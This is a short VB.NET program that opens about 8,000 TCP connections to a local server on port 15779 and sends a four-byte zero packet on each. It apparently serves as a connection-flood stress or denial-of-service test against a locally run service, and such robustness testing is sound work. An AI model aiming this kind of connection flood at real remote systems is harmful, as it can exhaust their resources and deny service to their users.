Imports System.Net, System.Net.Sockets
Module Module1

    Dim s(8000) As Socket

    Sub Main()
        Dim b

        Try
            For b = 0 To s.Length - 1
                s(b) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s(b).Connect(New IPEndPoint(IPAddress.Parse("127.0.0.1"), 15779))
                Threading.Thread.Sleep(10)
            Next
            b = 0
            For b = 0 To s.Length - 1
                s(b).Send(New Byte() {0, 0, 0, 0}, 4, SocketFlags.None)
            Next

        Catch ex As Exception
            Console.Write(b)
        End Try

    End Sub

End Module
